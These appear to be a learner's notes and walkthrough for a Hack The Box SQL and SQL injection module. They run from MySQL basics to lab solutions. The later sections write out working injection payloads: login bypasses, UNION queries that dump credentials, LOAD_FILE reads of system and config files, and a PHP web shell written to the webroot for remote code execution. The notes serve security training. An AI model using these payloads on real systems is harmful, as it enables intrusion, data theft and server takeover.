# Databases

## Intro to Databases

This section just covers the various types of databases that exist and historically what created them. The general overview is that we created ways to store data efficiently and one of these ways was SQL.

## Types of Databases

This covers the types of databases.

Relational databases are the most common and MySQL is the most common example of one.

In a relational database data is stored in a table with a key. This key gives you quick access to all we know about a specific entity in the table. For example in a customer table, the key would give us all we know about a specific customer.

In MySQL and other relational DBMS there are also ways to link other tables to each other. For instance a customer table might have an id as their key and another table might have a column called user_id to link the two together. This provides an easy way to get information from that table related to the customer we are looking at.

Non-relational databases (also called NoSQL) do not use tables, rows, and columns, or keys to store the data. Instead it stores the data using various models. Since there is no defined structure of data, storage is flexible. 

There are four common storage models:
Key-Value
Document-Based
Wide-Column
Graph

In Key-Value, data is usually stored in JSON or XML format. And it generates an ID for each key, where the value is the data

Data storage like this is most often compared to a dictionary in modern languages like Python. The most common form of NoSQL DB is MongoDB.

# MySQL

## Intro to MySQL

This section is an introduction of how to use MySQL. It gives tips on how to connect to a database, create a database, create tables, etc.

Some useful commands they provided:
`mysql -u root -p` (Connects as root and asks for password)
`mysql -u root -h docker.hackthebox.eu -P 3306 -p` Connects to a specific server as root
`CREATE DATABASE users;` (Creates a database names users)
`SHOW DATABASES;` (Shows all existing databases)
`USE users;` (Switches to acesssing the users database)

For creating tables we need to define which datatype will be stored in each column. So for instance a column called username would likely be a string of some type. These are usually stored as a varchar in the database. An example of a create table call looks like:

`CREATE TABLE logins (
    id INT,
    username VARCHAR(100),
    password VARCHAR(100),
    date_of_joining DATETIME
    );`

We can then run `SHOW TABLES;` to show all the tables on the current database and we will see that logins exists.

Then if we want to see how logins is structured, we can do `DESCRIBE logins;`

There are other things we can do when creating tables to make it better for data structuring. For instance we can add the NOT NULL flag to make sure a specific cell is never NULL. On Ints we can add the AUTO_INCREMENT flag to make it increase from the last one automatically. If the cell needs to be unique we can add the UNIQUE flag. On dates we can the DEFAULT NOW() flag. And finally we can define what we want our primary key to be by using PRIMARY KEY (<column name>)

An example using the logins table:
`CREATE TABLE logins (
    id INT NOT NULL AUTO_INCREMENT,
    username VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(100) NOT NULL,
    date_of_joining DATETIME DEFAULT NOW(),
    PRIMARY KEY (id)
    );`

The test on this section is:
Connect to the database using the MySQL client from the command line. Use the 'show databases;' command to list databases in the DBMS. What is the name of the first database? 

Once we start the instance we can connect using:
`mysql -u root -h <IP> -P <PORT> -p`
Then simply run `SHOW DATABASES;`

The answer was employees.

## SQL Statements

This section covers relavent and important SQL statements.

The examples include how to insert into a table. We can insert into a table like:
`INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');`

But we don't actually have to define the id column or date because these have default values. So we can do:
`INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');`

Then to retrieve stuff from a table we can use a select statement. If we do `SELECT * FROM table_name;` it will get everything in a table.

Or we can do `SELECT column1, column2 FROM table_name;` and just get the first two columns.

We can use DROP to remove tables from a database. An example of this would be `DROP TABLE logins;`

If we want to add a new column to a table, we can use ALTER. An example of this:
`ALTER TABLE logins ADD newColumn INT;`

Or we can change an existing column:
`ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn;`

We can change a columns datatype with MODIFY:
`ALTER TABLE logins MODIFY oldColumn DATE;`

And we can also a DROP a column:
`ALTER TABLE logins DROP oldColumn;`

We can use UPDATE to change specific records in a table:
`UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;`

An example of this could look like:
`UPDATE logins SET password = 'change_password' WHERE id > 1;`

The question in this section was:
What is the department number for the 'Development' department? 

To get this we first need to run `use employees;` to switch to that database.
Then we can run `SHOW TABLES;` to see that there is a departments table.
Then we can run `SELECT * FROM departments;` to get the answer

## Query Results

This section just covers how to filter and order our results.

If we want to sort our results we can using ORDER BY, this defaults to ascending but can use DESC to flip this.
Examples:
`SELECT * FROM logins ORDER BY password;`
`SELECT * FROM logins ORDER BY password DESC;`

You can also sort by multiple columns like:
`SELECT * FROM logins ORDER BY password DESC, id ASC;`

If we want to limit how many results are returned we can use LIMIT like:
`SELECT * FROM logins LIMIT 2;`

If we wanted to LIMIT results with an offset, we could specify the offset before the LIMIT count:
`SELECT * FROM logins LIMIT 1, 2;`

To filter our results we can use WHERE like:
`SELECT * FROM logins WHERE id > 1;`

We can also use LIKE to get records that match a certain pattern:
`SELECT * FROM logins WHERE username LIKE 'admin%';`

% acts a wild card so any record with a username starting in admin will be returned.

We can also use _ as a way to match anyone character:
`SELECT * FROM logins WHERE username like '___';`

This would return any record that is only 3 characters long.

The question for this section is:
What is the last name of the employee whose first name starts with "Bar" AND who was hired on 1990-01-01? 

To solve this we can run `select * from employees where first_name LIKE 'Bar%' ORDER BY hire_date DESC;`

## SQL Operators

This section just covers common operators (i.e. AND, OR, NOT)

I know all this information already and don't feel like re-documenting it.

The question in this section was:
In the 'titles' table, what is the number of records WHERE the employee number is greater than 10000 OR their title does NOT contain 'engineer'? 

To get this we can run:
`SELECT * FROM titles where emp_no > 10000 OR title NOT LIKE '%Engineer%';`

The answer was 654

# SQL Injections

## Intro to SQL Injections

There are many types of SQL Injections. Examples include In-Band (which is split into union based and error based), Blind (split into Boolean Based and Time Based), and Out of band.

A SQL injection is when a web application that use SQL in the backend takes input from a user that breaks the expected query in a way that allows the user to perform a different malicious command on the database.

in general this can be avoided by sanatizing input and never trusing user input as is.

An example of a vulnerable command would be:
`$searchInput =  $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query)`

In it you can see that the user's input is used directly and not sanatized at all. Alongside this, usually commands like these should be parameterized.

## Subverting Query Logic

This section covers subverting a query by using the OR operator to have a return value always be true.

The example given is the classic SQL injection example `' or '1' = '1`

The example test on this page is a bit silly, we are given a page in which it literally tells us the query being run and exactly how. So subverting it is very easy.

The question on this section is:
Try to log in as the user 'tom'. What is the flag value shown after you successfully log in? 

To do this, we want to enter `tom' or '1' = '1` in the username field and submit. This allows us to log in because the resulting query is true and the tom as a login exists. If it did not it would fail.

## Using Comments

This sections using comments in SQL and how it can be used to subvert sql queries.

There are 3 types of comments in MySQL with --, #, and /**/. But only the first two are usually used in sql injections.

From the previous section we can achieve logging into the page as admin with just `admin'--`

It mentions in this sections its possible to force an evaluation to happen first with parantheses. And this can make it harder to just use the comment to login.

This is still relatively easy to subvert by simply adding a closing brace before your comment.

The question for this section is: 
 Login as the user with the id 5 to get the flag. 

To do this we can enter `') OR id=5 -- ` into the username field. the ') closes the original username check, then we can get the id we want using OR then end it with -- with a space at the end to kill the rest of the query.

## Union Clause

This section covers using a UNION clause to dump whole other tables after a sql query. An example SQL Query using union that gets all the data out of two tables would be `SELECT * FROM ports UNION SELECT * FROM ships;`

But the above query won't always work. A UNION requires both tables to have the same number of columns. So if either of the tables does not this query fails.

To avoid this we can intentionally add false columns to our query to match the same number. The best way to do this is by looking for a NULL column for as many times as we need to match.

The question on this section was:
Connect to the above MySQL server with the 'mysql' tool, and find the number of records returned when doing a 'Union' of all records in the 'employees' table and all records in the 'departments' table. 

To solve this I ran `mysql -h 83.136.249.57 -P 32347 -u root -p` to connect to the instance.

Then I ran Select * on both tables and counted the columns. The first had 6 and the second had 2.

So to get the answer I ran `select * from employees UNION select dept_no, dept_name, NULL, NULL, NULL, NULL from departments;`

## Union Injection

This section covers union injection. The first thing it covers is how to determine how many columns we have and how to make sure the output that we want is displayed to the screen. 

There are two ways to do this, we can use the ORDER BY command on each column and when it fails to work we know its one less then the number we tried.

Or we can use the union and just guess the numbers like `cn' UNION select 1,2,3-- -` as we increase this number we will eventually find the failure. An added benefit of this method is it tells us which columns are actually displayed.

The question on this section is:
 Use a Union injection to get the result of 'user()'

The answer is to run `cn' UNION select 1,user(),3,4-- -`

# Exploitation

## Database Enumeration

This section covers how to perform database enumeration of a databases once we have found a sql injection. Since this covers MySQL, it only covers how to verify if we are working with them.

For that we can use SELECT @@version when we have full output. We can expect something like 10.3.22-MariaDB-1ubuntu1, or an error if its not MySQL.
If we only have numeric output, we can use SELECT POW(1,1), and we can expect 1 as the output if we are on MySQL, or an error if not.
Of if we have no output we can use, SELECT SLEEP(5) which will cause the page to wait 5 seconds before displaying.

After we know we are on MySQL, we can start our enumeration. Our enumeration relies on the INFORMATION_SCHEMA database to do our work. So the first thing we can do is run:
`SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;` Which will display all databases.

So for our example sql injection it would look something like:
`cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`

Then we want to know which of these databases we are already working on so we can use database(), like:
`cn' UNION select 1,database(),2,3-- -`

Now we know which db we are on, we can start checking the other dbs, using the . operator.

The first thing we want to knoiw is the tables in the other databases, which we can find in the TABLE_SCHEMA and TABLE_NAME columns in INFORMATION_SCHEMA.

For our example we can use:
`cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -`

Finally we want to know what the names of the columns in the tables we are interested in are. For this we can use COLUMN_NAME in INFORMATION_SCHEMA.

For our example we can use:
`cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -`

Then once we know what table we want we can just use our union select to get the information.
`cn' UNION select 1, username, password, 4 from dev.credentials-- -`

The question in this section was:
What is the password hash for 'newuser' stored in the 'users' table in the 'ilfreight' database? 

To answer this, I first ran `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='ilfreight'-- -` to get the tables that are relevant.

Then I ran `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -` to get the relevant columns.

Then I ran `cn' UNION select 1, username, password, 4 from ilfreight.users-- -`

## Reading Files

This page covers how to check what user we are and see if we have file read permissions.

In MySQL we can use `SELECT USER()` to determine our user.
We can use `SELECT super_priv FROM mysql.user` to determine if we have super admin priviliges.

and we can use `cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -` to get a list of all of our priviliges.

To load a file we can do `SELECT LOAD_FILE('/etc/passwd');`

We can also get the source code of the page we are on using something like:
`cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -`

The question for this section is:
We see in the above PHP code that '$conn' is not defined, so it must be imported using the PHP include command. Check the imported page to obtain the database password.

To get this, we can look at the page source of the search.php page and notice they are importing a config.php file. Then all we need is run: `cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -`

That gives us the source of that file and the password is in the page.

## Writing Files

This section covers Writing Files with SQL Injection. It covers that a lot of SQL DBs default to not allowing any reading or writing. But we can check Information_schema to check for sure.

To be able to write we need a user wtih file permissions, and then the database needs write permissions. We have already covered how to check the user, to check the database we can use:
`cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -`

If the variable is NULL we have full priviliges.

Then we can do some testing by writing to the webroot.
If we want to write a web shell we cand o something like: `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`

Then we can execute commands using the 0 parameter, like `?0=id`

The question for this section was:
 Find the flag by using a webshell.

To answer this question we can create our webshell, then run `?0= ls ..`. This gives us a list of contents in the directory above. And we see the flag.txt file. So to get the contents we can simply do `?0 =cat ../flag.txt` 

# Mitigation

## Mitigation SQL Injections

This section covers ways to mitigate SQL Injection risks.

First we can make sure that any and all input is sanatized. We can also make sure the input is valid. We can make sure users running queries have the least privilige they need. We can use a WAF to detect malicious input and reject any HTTP requests using them. We can use parameterized queries.

# Closing it Out

## Skills Assessment

The skills assessment here is:
Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer. 

To do this, the first thing I did was run this on the login page:
`admin' or 1=1 -- `

This gets us to a page with a search bar and when you run this `' Union select 1,2,3,4, 5 -- -`you find that there are 5 columns in the current DB and columns 2,3,4,5 are displayed.

So then I ran `' Union select 1,user(),3,4, 5 -- -` and found we are root@localhost`

So then I ran `' UNION select 1,schema_name,3,4,5 from INFORMATION_SCHEMA.SCHEMATA-- -` and got the names of the other databases.

Then I ran `' Union select 1,Database(),3,4, 5 -- -` and found we are on ilfreight.

Then I checked if we had file priviliges, we do. So I checked if we have write priviliges with:
`' UNION SELECT 1, variable_name, variable_value, 4, 5 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -`

And the result is null, so we do. So I tried to run: `' union select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into outfile '/var/www/html/shell.php'-- -` but I get permission denied.

So we notice that the url is actually dashboard/dashboard.php, so I tried `' union select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into outfile '/var/www/html/dashboard/shell.php'-- -` and that worked.

Then I just ran ls on the current directory, and then ls .., and then ls ../../..... Until I found the root directory. Then I did, `http://94.237.56.188:46254/dashboard/shell.php?0=cat%20../../../../../flag_cae1dadcd174.txt` and got the answer.

